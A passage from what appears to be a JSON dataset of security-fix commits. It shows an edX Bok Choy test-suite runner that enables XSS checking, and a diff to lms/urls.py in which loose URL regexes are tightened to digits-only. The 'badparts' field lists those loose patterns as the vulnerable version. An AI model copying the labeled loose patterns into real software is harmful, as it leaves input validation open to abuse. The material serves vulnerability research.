                    "source": "\n\"\"\" Class used for defining and running Bok Choy acceptance test suite \"\"\" from time import sleep from urllib import urlencode from common.test.acceptance.fixtures.course import CourseFixture, FixtureError from path import Path as path from paver.easy import sh, BuildFailure from pavelib.utils.test.suites.suite import TestSuite from pavelib.utils.envs import Env from pavelib.utils.test import bokchoy_utils from pavelib.utils.test import utils as test_utils import os try: from pygments.console import colorize except ImportError: colorize=lambda color, text: text __test__=False DEFAULT_NUM_PROCESSES=1 DEFAULT_VERBOSITY=2 class BokChoyTestSuite(TestSuite): \"\"\" TestSuite for running Bok Choy tests Properties(below is a subset): test_dir -parent directory for tests log_dir -directory for test output report_dir -directory for reports(e.g., coverage) related to test execution xunit_report -directory for xunit-style output(xml) fasttest -when set, skip various set-up tasks(e.g., collectstatic) serversonly -prepare and run the necessary servers, only stopping when interrupted with Ctrl-C testsonly -assume servers are running(as per above) and run tests with no setup or cleaning of environment test_spec -when set, specifies test files, classes, cases, etc. See platform doc. default_store -modulestore to use when running tests(split or draft) num_processes -number of processes or threads to use in tests. Recommendation is that this is less than or equal to the number of available processors. verify_xss -when set, check for XSS vulnerabilities in the page HTML. See nosetest documentation: http://nose.readthedocs.org/en/latest/usage.html \"\"\" def __init__(self, *args, **kwargs): super(BokChoyTestSuite, self).__init__(*args, **kwargs) self.test_dir=Env.BOK_CHOY_DIR / kwargs.get('test_dir', 'tests') self.log_dir=Env.BOK_CHOY_LOG_DIR self.report_dir=kwargs.get('report_dir', Env.BOK_CHOY_REPORT_DIR) self.xunit_report=self.report_dir / \"xunit.xml\" self.cache=Env.BOK_CHOY_CACHE self.fasttest=kwargs.get('fasttest', False) self.serversonly=kwargs.get('serversonly', False) self.testsonly=kwargs.get('testsonly', False) self.test_spec=kwargs.get('test_spec', None) self.default_store=kwargs.get('default_store', None) self.verbosity=kwargs.get('verbosity', DEFAULT_VERBOSITY) self.num_processes=kwargs.get('num_processes', DEFAULT_NUM_PROCESSES) self.verify_xss=kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False)) self.extra_args=kwargs.get('extra_args', '') self.har_dir=self.log_dir / 'hars' self.a11y_file=Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE self.imports_dir=kwargs.get('imports_dir', None) self.coveragerc=kwargs.get('coveragerc', None) self.save_screenshots=kwargs.get('save_screenshots', False) def __enter__(self): super(BokChoyTestSuite, self).__enter__() self.log_dir.makedirs_p() self.har_dir.makedirs_p() self.report_dir.makedirs_p() test_utils.clean_reports_dir() if not(self.fasttest or self.skip_clean or self.testsonly): test_utils.clean_test_files() msg=colorize('green', \"Checking for mongo, memchache, and mysql...\") print msg bokchoy_utils.check_services() if not self.testsonly: self.prepare_bokchoy_run() else: self.load_data() msg=colorize('green', \"Confirming servers have started...\") print msg bokchoy_utils.wait_for_test_servers() try: CourseFixture('foobar_org', '1117', 'seed_forum', 'seed_foo').install() print 'Forums permissions/roles data has been seeded' except FixtureError: pass if self.serversonly: self.run_servers_continuously() def __exit__(self, exc_type, exc_value, traceback): super(BokChoyTestSuite, self).__exit__(exc_type, exc_value, traceback) if self.testsonly: msg=colorize('green', 'Running in testsonly mode... SKIPPING database cleanup.') print msg else: msg=colorize('green', \"Cleaning up databases...\") print msg sh(\"./manage.py lms --settings bok_choy flush --traceback --noinput\") bokchoy_utils.clear_mongo() def verbosity_processes_string(self): \"\"\" Multiprocessing, xunit, color, and verbosity do not work well together. We need to construct the proper combination for use with nosetests. \"\"\" substring=[] if self.verbosity !=DEFAULT_VERBOSITY and self.num_processes !=DEFAULT_NUM_PROCESSES: msg='Cannot pass in both num_processors and verbosity. Quitting' raise BuildFailure(msg) if self.num_processes !=1: substring=[ \"--with-xunitmp --xunitmp-file={}\".format(self.xunit_report), \"--processes={}\".format(self.num_processes), \"--no-color --process-timeout=1200\" ] else: substring=[ \"--with-xunit\", \"--xunit-file={}\".format(self.xunit_report), \"--verbosity={}\".format(self.verbosity), ] return \" \".join(substring) def prepare_bokchoy_run(self): \"\"\" Sets up and starts servers for a Bok Choy run. If --fasttest is not specified then static assets are collected \"\"\" sh(\"{}/scripts/reset-test-db.sh\".format(Env.REPO_ROOT)) if not self.fasttest: self.generate_optimized_static_assets() bokchoy_utils.clear_mongo() self.cache.flush_all() self.load_data() self.load_courses() msg=colorize('green', \"Confirming servers are running...\") print msg bokchoy_utils.start_servers(self.default_store, self.coveragerc) def load_courses(self): \"\"\" Loads courses from self.imports_dir. Note: self.imports_dir is the directory that contains the directories that have courses in them. For example, if the course is located in `test_root/courses/test-example-course/`, self.imports_dir should be `test_root/courses/`. \"\"\" msg=colorize('green', \"Importing courses from{}...\".format(self.imports_dir)) print msg if self.imports_dir: sh( \"DEFAULT_STORE={default_store}\" \"./manage.py cms --settings=bok_choy import{import_dir}\".format( default_store=self.default_store, import_dir=self.imports_dir ) ) def load_data(self): \"\"\" Loads data into database from db_fixtures \"\"\" print 'Loading data from json fixtures in db_fixtures directory' sh( \"DEFAULT_STORE={default_store}\" \"./manage.py lms --settings bok_choy loaddata --traceback\" \" common/test/db_fixtures/*.json\".format( default_store=self.default_store, ) ) def run_servers_continuously(self): \"\"\" Infinite loop. Servers will continue to run in the current session unless interrupted. \"\"\" print 'Bok-choy servers running. Press Ctrl-C to exit...\\n' print 'Note: pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\\n' while True: try: sleep(10000) except KeyboardInterrupt: print \"Stopping bok-choy servers.\\n\" break @property def cmd(self): \"\"\" This method composes the nosetests command to send to the terminal. If nosetests aren't being run, the command returns an empty string. \"\"\" if not self.test_spec: test_spec=self.test_dir else: test_spec=self.test_dir / self.test_spec if self.serversonly: return \"\" cmd=[ \"DEFAULT_STORE={}\".format(self.default_store), \"SCREENSHOT_DIR='{}'\".format(self.log_dir), \"BOK_CHOY_HAR_DIR='{}'\".format(self.har_dir), \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{}'\".format(self.a11y_file), \"SELENIUM_DRIVER_LOG_DIR='{}'\".format(self.log_dir), \"VERIFY_XSS='{}'\".format(self.verify_xss), \"nosetests\", test_spec, \"{}\".format(self.verbosity_processes_string()) ] if self.pdb: cmd.append(\"--pdb\") if self.save_screenshots: cmd.append(\"--with-save-baseline\") cmd.append(self.extra_args) cmd=(\" \").join(cmd) return cmd class Pa11yCrawler(BokChoyTestSuite): \"\"\" Sets up test environment with mega-course loaded, and runs pa11ycralwer against it. \"\"\" def __init__(self, *args, **kwargs): super(Pa11yCrawler, self).__init__(*args, **kwargs) self.course_key=kwargs.get('course_key') if self.imports_dir: self.should_fetch_course=False else: self.should_fetch_course=kwargs.get('should_fetch_course') self.imports_dir=path('test_root/courses/') self.pa11y_report_dir=os.path.join(self.report_dir, 'pa11ycrawler_reports') self.tar_gz_file=\"https://github.com/edx/demo-test-course/archive/master.tar.gz\" self.start_urls=[] auto_auth_params={ \"redirect\": 'true', \"staff\": 'true', \"course_id\": self.course_key, } cms_params=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8031/auto_auth?{}\\\"\".format(cms_params)) sequence_url=\"/api/courses/v1/blocks/?{}\".format( urlencode({ \"course_id\": self.course_key, \"depth\": \"all\", \"all_blocks\": \"true\", }) ) auto_auth_params.update({'redirect_to': sequence_url}) lms_params=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8003/auto_auth?{}\\\"\".format(lms_params)) def __enter__(self): if self.should_fetch_course: self.get_test_course() super(Pa11yCrawler, self).__enter__() def get_test_course(self): \"\"\" Fetches the test course. \"\"\" self.imports_dir.makedirs_p() zipped_course=self.imports_dir +'demo_course.tar.gz' msg=colorize('green', \"Fetching the test course from github...\") print msg sh( 'wget{tar_gz_file} -O{zipped_course}'.format( tar_gz_file=self.tar_gz_file, zipped_course=zipped_course, ) ) msg=colorize('green', \"Uncompressing the test course...\") print msg sh( 'tar zxf{zipped_course} -C{courses_dir}'.format( zipped_course=zipped_course, courses_dir=self.imports_dir, ) ) def generate_html_reports(self): \"\"\" Runs pa11ycrawler json-to-html \"\"\" cmd_str=( 'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={report_dir}' ).format(report_dir=self.pa11y_report_dir) sh(cmd_str) @property def cmd(self): \"\"\" Runs pa11ycrawler as staff user against the test course. \"\"\" cmd_str=( 'pa11ycrawler run{start_urls} ' '--pa11ycrawler-allowed-domains={allowed_domains} ' '--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher={dont_go_here} ' '--pa11y-reporter=\"{reporter}\" ' '--depth-limit={depth} ' ).format( start_urls=' '.join(self.start_urls), allowed_domains='localhost', report_dir=self.pa11y_report_dir, reporter=\"1.0-json\", dont_go_here=\"logout\", depth=\"6\", ) return cmd_str ",
                    "sourceWithComments": "\"\"\"\nClass used for defining and running Bok Choy acceptance test suite\n\"\"\"\nfrom time import sleep\nfrom urllib import urlencode\n\nfrom common.test.acceptance.fixtures.course import CourseFixture, FixtureError\n\nfrom path import Path as path\nfrom paver.easy import sh, BuildFailure\nfrom pavelib.utils.test.suites.suite import TestSuite\nfrom pavelib.utils.envs import Env\nfrom pavelib.utils.test import bokchoy_utils\nfrom pavelib.utils.test import utils as test_utils\n\nimport os\n\ntry:\n    from pygments.console import colorize\nexcept ImportError:\n    colorize = lambda color, text: text\n\n__test__ = False  # do not collect\n\nDEFAULT_NUM_PROCESSES = 1\nDEFAULT_VERBOSITY = 2\n\n\nclass BokChoyTestSuite(TestSuite):\n    \"\"\"\n    TestSuite for running Bok Choy tests\n    Properties (below is a subset):\n      test_dir - parent directory for tests\n      log_dir - directory for test output\n      report_dir - directory for reports (e.g., coverage) related to test execution\n      xunit_report - directory for xunit-style output (xml)\n      fasttest - when set, skip various set-up tasks (e.g., collectstatic)\n      serversonly - prepare and run the necessary servers, only stopping when interrupted with Ctrl-C\n      testsonly - assume servers are running (as per above) and run tests with no setup or cleaning of environment\n      test_spec - when set, specifies test files, classes, cases, etc. See platform doc.\n      default_store - modulestore to use when running tests (split or draft)\n      num_processes - number of processes or threads to use in tests. Recommendation is that this\n      is less than or equal to the number of available processors.\n      verify_xss - when set, check for XSS vulnerabilities in the page HTML.\n      See nosetest documentation: http://nose.readthedocs.org/en/latest/usage.html\n    \"\"\"\n    def __init__(self, *args, **kwargs):\n        super(BokChoyTestSuite, self).__init__(*args, **kwargs)\n        self.test_dir = Env.BOK_CHOY_DIR / kwargs.get('test_dir', 'tests')\n        self.log_dir = Env.BOK_CHOY_LOG_DIR\n        self.report_dir = kwargs.get('report_dir', Env.BOK_CHOY_REPORT_DIR)\n        self.xunit_report = self.report_dir / \"xunit.xml\"\n        self.cache = Env.BOK_CHOY_CACHE\n        self.fasttest = kwargs.get('fasttest', False)\n        self.serversonly = kwargs.get('serversonly', False)\n        self.testsonly = kwargs.get('testsonly', False)\n        self.test_spec = kwargs.get('test_spec', None)\n        self.default_store = kwargs.get('default_store', None)\n        self.verbosity = kwargs.get('verbosity', DEFAULT_VERBOSITY)\n        self.num_processes = kwargs.get('num_processes', DEFAULT_NUM_PROCESSES)\n        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False))\n        self.extra_args = kwargs.get('extra_args', '')\n        self.har_dir = self.log_dir / 'hars'\n        self.a11y_file = Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE\n        self.imports_dir = kwargs.get('imports_dir', None)\n        self.coveragerc = kwargs.get('coveragerc', None)\n        self.save_screenshots = kwargs.get('save_screenshots', False)\n\n    def __enter__(self):\n        super(BokChoyTestSuite, self).__enter__()\n\n        # Ensure that we have a directory to put logs and reports\n        self.log_dir.makedirs_p()\n        self.har_dir.makedirs_p()\n        self.report_dir.makedirs_p()\n        test_utils.clean_reports_dir()      # pylint: disable=no-value-for-parameter\n\n        if not (self.fasttest or self.skip_clean or self.testsonly):\n            test_utils.clean_test_files()\n\n        msg = colorize('green', \"Checking for mongo, memchache, and mysql...\")\n        print msg\n        bokchoy_utils.check_services()\n\n        if not self.testsonly:\n            self.prepare_bokchoy_run()\n        else:\n            # load data in db_fixtures\n            self.load_data()\n\n        msg = colorize('green', \"Confirming servers have started...\")\n        print msg\n        bokchoy_utils.wait_for_test_servers()\n        try:\n            # Create course in order to seed forum data underneath. This is\n            # a workaround for a race condition. The first time a course is created;\n            # role permissions are set up for forums.\n            CourseFixture('foobar_org', '1117', 'seed_forum', 'seed_foo').install()\n            print 'Forums permissions/roles data has been seeded'\n        except FixtureError:\n            # this means it's already been done\n            pass\n\n        if self.serversonly:\n            self.run_servers_continuously()\n\n    def __exit__(self, exc_type, exc_value, traceback):\n        super(BokChoyTestSuite, self).__exit__(exc_type, exc_value, traceback)\n\n        # Using testsonly will leave all fixtures in place (Note: the db will also be dirtier.)\n        if self.testsonly:\n            msg = colorize('green', 'Running in testsonly mode... SKIPPING database cleanup.')\n            print msg\n        else:\n            # Clean up data we created in the databases\n            msg = colorize('green', \"Cleaning up databases...\")\n            print msg\n            sh(\"./manage.py lms --settings bok_choy flush --traceback --noinput\")\n            bokchoy_utils.clear_mongo()\n\n    def verbosity_processes_string(self):\n        \"\"\"\n        Multiprocessing, xunit, color, and verbosity do not work well together. We need to construct\n        the proper combination for use with nosetests.\n        \"\"\"\n        substring = []\n\n        if self.verbosity != DEFAULT_VERBOSITY and self.num_processes != DEFAULT_NUM_PROCESSES:\n            msg = 'Cannot pass in both num_processors and verbosity. Quitting'\n            raise BuildFailure(msg)\n\n        if self.num_processes != 1:\n            # Construct \"multiprocess\" nosetest substring\n            substring = [\n                \"--with-xunitmp --xunitmp-file={}\".format(self.xunit_report),\n                \"--processes={}\".format(self.num_processes),\n                \"--no-color --process-timeout=1200\"\n            ]\n\n        else:\n            substring = [\n                \"--with-xunit\",\n                \"--xunit-file={}\".format(self.xunit_report),\n                \"--verbosity={}\".format(self.verbosity),\n            ]\n\n        return \" \".join(substring)\n\n    def prepare_bokchoy_run(self):\n        \"\"\"\n        Sets up and starts servers for a Bok Choy run. If --fasttest is not\n        specified then static assets are collected\n        \"\"\"\n        sh(\"{}/scripts/reset-test-db.sh\".format(Env.REPO_ROOT))\n\n        if not self.fasttest:\n            self.generate_optimized_static_assets()\n\n        # Clear any test data already in Mongo or MySQLand invalidate\n        # the cache\n        bokchoy_utils.clear_mongo()\n        self.cache.flush_all()\n\n        # load data in db_fixtures\n        self.load_data()\n\n        # load courses if self.imports_dir is set\n        self.load_courses()\n\n        # Ensure the test servers are available\n        msg = colorize('green', \"Confirming servers are running...\")\n        print msg\n        bokchoy_utils.start_servers(self.default_store, self.coveragerc)\n\n    def load_courses(self):\n        \"\"\"\n        Loads courses from self.imports_dir.\n\n        Note: self.imports_dir is the directory that contains the directories\n        that have courses in them. For example, if the course is located in\n        `test_root/courses/test-example-course/`, self.imports_dir should be\n        `test_root/courses/`.\n        \"\"\"\n        msg = colorize('green', \"Importing courses from {}...\".format(self.imports_dir))\n        print msg\n\n        if self.imports_dir:\n            sh(\n                \"DEFAULT_STORE={default_store}\"\n                \" ./manage.py cms --settings=bok_choy import {import_dir}\".format(\n                    default_store=self.default_store,\n                    import_dir=self.imports_dir\n                )\n            )\n\n    def load_data(self):\n        \"\"\"\n        Loads data into database from db_fixtures\n        \"\"\"\n        print 'Loading data from json fixtures in db_fixtures directory'\n        sh(\n            \"DEFAULT_STORE={default_store}\"\n            \" ./manage.py lms --settings bok_choy loaddata --traceback\"\n            \" common/test/db_fixtures/*.json\".format(\n                default_store=self.default_store,\n            )\n        )\n\n    def run_servers_continuously(self):\n        \"\"\"\n        Infinite loop. Servers will continue to run in the current session unless interrupted.\n        \"\"\"\n        print 'Bok-choy servers running. Press Ctrl-C to exit...\\n'\n        print 'Note: pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\\n'\n\n        while True:\n            try:\n                sleep(10000)\n            except KeyboardInterrupt:\n                print \"Stopping bok-choy servers.\\n\"\n                break\n\n    @property\n    def cmd(self):\n        \"\"\"\n        This method composes the nosetests command to send to the terminal. If nosetests aren't being run,\n         the command returns an empty string.\n        \"\"\"\n        # Default to running all tests if no specific test is specified\n        if not self.test_spec:\n            test_spec = self.test_dir\n        else:\n            test_spec = self.test_dir / self.test_spec\n\n        # Skip any additional commands (such as nosetests) if running in\n        # servers only mode\n        if self.serversonly:\n            return \"\"\n\n        # Construct the nosetests command, specifying where to save\n        # screenshots and XUnit XML reports\n        cmd = [\n            \"DEFAULT_STORE={}\".format(self.default_store),\n            \"SCREENSHOT_DIR='{}'\".format(self.log_dir),\n            \"BOK_CHOY_HAR_DIR='{}'\".format(self.har_dir),\n            \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{}'\".format(self.a11y_file),\n            \"SELENIUM_DRIVER_LOG_DIR='{}'\".format(self.log_dir),\n            \"VERIFY_XSS='{}'\".format(self.verify_xss),\n            \"nosetests\",\n            test_spec,\n            \"{}\".format(self.verbosity_processes_string())\n        ]\n        if self.pdb:\n            cmd.append(\"--pdb\")\n        if self.save_screenshots:\n            cmd.append(\"--with-save-baseline\")\n        cmd.append(self.extra_args)\n\n        cmd = (\" \").join(cmd)\n        return cmd\n\n\nclass Pa11yCrawler(BokChoyTestSuite):\n    \"\"\"\n    Sets up test environment with mega-course loaded, and runs pa11ycralwer\n    against it.\n    \"\"\"\n\n    def __init__(self, *args, **kwargs):\n        super(Pa11yCrawler, self).__init__(*args, **kwargs)\n        self.course_key = kwargs.get('course_key')\n        if self.imports_dir:\n            # If imports_dir has been specified, assume the files are\n            # already there -- no need to fetch them from github. This\n            # allows someome to crawl a different course. They are responsible\n            # for putting it, un-archived, in the directory.\n            self.should_fetch_course = False\n        else:\n            # Otherwise, obey `--skip-fetch` command and use the default\n            # test course.  Note that the fetch will also be skipped when\n            # using `--fast`.\n            self.should_fetch_course = kwargs.get('should_fetch_course')\n            self.imports_dir = path('test_root/courses/')\n\n        self.pa11y_report_dir = os.path.join(self.report_dir, 'pa11ycrawler_reports')\n        self.tar_gz_file = \"https://github.com/edx/demo-test-course/archive/master.tar.gz\"\n\n        self.start_urls = []\n        auto_auth_params = {\n            \"redirect\": 'true',\n            \"staff\": 'true',\n            \"course_id\": self.course_key,\n        }\n        cms_params = urlencode(auto_auth_params)\n        self.start_urls.append(\"\\\"http://localhost:8031/auto_auth?{}\\\"\".format(cms_params))\n\n        sequence_url = \"/api/courses/v1/blocks/?{}\".format(\n            urlencode({\n                \"course_id\": self.course_key,\n                \"depth\": \"all\",\n                \"all_blocks\": \"true\",\n            })\n        )\n        auto_auth_params.update({'redirect_to': sequence_url})\n        lms_params = urlencode(auto_auth_params)\n        self.start_urls.append(\"\\\"http://localhost:8003/auto_auth?{}\\\"\".format(lms_params))\n\n    def __enter__(self):\n        if self.should_fetch_course:\n            self.get_test_course()\n        super(Pa11yCrawler, self).__enter__()\n\n    def get_test_course(self):\n        \"\"\"\n        Fetches the test course.\n        \"\"\"\n        self.imports_dir.makedirs_p()\n        zipped_course = self.imports_dir + 'demo_course.tar.gz'\n\n        msg = colorize('green', \"Fetching the test course from github...\")\n        print msg\n\n        sh(\n            'wget {tar_gz_file} -O {zipped_course}'.format(\n                tar_gz_file=self.tar_gz_file,\n                zipped_course=zipped_course,\n            )\n        )\n\n        msg = colorize('green', \"Uncompressing the test course...\")\n        print msg\n\n        sh(\n            'tar zxf {zipped_course} -C {courses_dir}'.format(\n                zipped_course=zipped_course,\n                courses_dir=self.imports_dir,\n            )\n        )\n\n    def generate_html_reports(self):\n        \"\"\"\n        Runs pa11ycrawler json-to-html\n        \"\"\"\n        cmd_str = (\n            'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={report_dir}'\n        ).format(report_dir=self.pa11y_report_dir)\n\n        sh(cmd_str)\n\n    @property\n    def cmd(self):\n        \"\"\"\n        Runs pa11ycrawler as staff user against the test course.\n        \"\"\"\n        cmd_str = (\n            'pa11ycrawler run {start_urls} '\n            '--pa11ycrawler-allowed-domains={allowed_domains} '\n            '--pa11ycrawler-reports-dir={report_dir} '\n            '--pa11ycrawler-deny-url-matcher={dont_go_here} '\n            '--pa11y-reporter=\"{reporter}\" '\n            '--depth-limit={depth} '\n        ).format(\n            start_urls=' '.join(self.start_urls),\n            allowed_domains='localhost',\n            report_dir=self.pa11y_report_dir,\n            reporter=\"1.0-json\",\n            dont_go_here=\"logout\",\n            depth=\"6\",\n        )\n        return cmd_str\n"
                }
            },
            "msg": "Enable VERIFY_XSS checking by default."
        }
    },
    "https://github.com/jlrivera81/incr-228": {
        "4e4c209ae3deb4c78bcec89c181516af8604b450": {
            "url": "https://api.github.com/repos/jlrivera81/incr-228/commits/4e4c209ae3deb4c78bcec89c181516af8604b450",
            "html_url": "https://github.com/jlrivera81/incr-228/commit/4e4c209ae3deb4c78bcec89c181516af8604b450",
            "sha": "4e4c209ae3deb4c78bcec89c181516af8604b450",
            "keyword": "XSS malicious",
            "diff": "diff --git a/lms/urls.py b/lms/urls.py\nindex 776a518599..fe9882b180 100644\n--- a/lms/urls.py\n+++ b/lms/urls.py\n@@ -223,27 +223,27 @@\n             'courseware.views.course_info', name=\"info\"),\n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n             'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',\n             'staticbook.views.index', name=\"book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.index'),\n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$',\n             'staticbook.views.index_shifted'),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',\n+            'staticbook.views.pdf_index', name=\"pdf_book\"),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n-            'staticbook.views.pdf_index'),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n-            'staticbook.views.pdf_index'),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n-            'staticbook.views.pdf_index'),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n+            'staticbook.views.pdf_index', name=\"pdf_book\"),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',\n+            'staticbook.views.pdf_index', name=\"pdf_book\"),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',\n+            'staticbook.views.html_index', name=\"html_book\"),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n             'staticbook.views.html_index', name=\"html_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n-            'staticbook.views.html_index'),\n \n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n             'courseware.views.index', name=\"courseware\"),\n",
            "message": "",
            "files": {
                "/lms/urls.py": {
                    "changes": [
                        {
                            "diff": "\n             'courseware.views.course_info', name=\"info\"),\n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n             'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',\n             'staticbook.views.index', name=\"book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.index'),\n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$',\n             'staticbook.views.index_shifted'),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',\n+            'staticbook.views.pdf_index', name=\"pdf_book\"),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n-            'staticbook.views.pdf_index'),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n-            'staticbook.views.pdf_index'),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n-            'staticbook.views.pdf_index'),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n+            'staticbook.views.pdf_index', name=\"pdf_book\"),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',\n+            'staticbook.views.pdf_index', name=\"pdf_book\"),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',\n+            'staticbook.views.html_index', name=\"html_book\"),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n             'staticbook.views.html_index', name=\"html_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n-            'staticbook.views.html_index'),\n \n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n             'courseware.views.index', name=\"courseware\"),\n",
                            "add": 12,
                            "remove": 12,
                            "filename": "/lms/urls.py",
                            "badparts": [
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',",
                                "            'staticbook.views.pdf_index'),",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',",
                                "            'staticbook.views.pdf_index'),",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',",
                                "            'staticbook.views.pdf_index'),",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',",
                                "            'staticbook.views.html_index'),"
                            ],
                            "goodparts": [
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',",
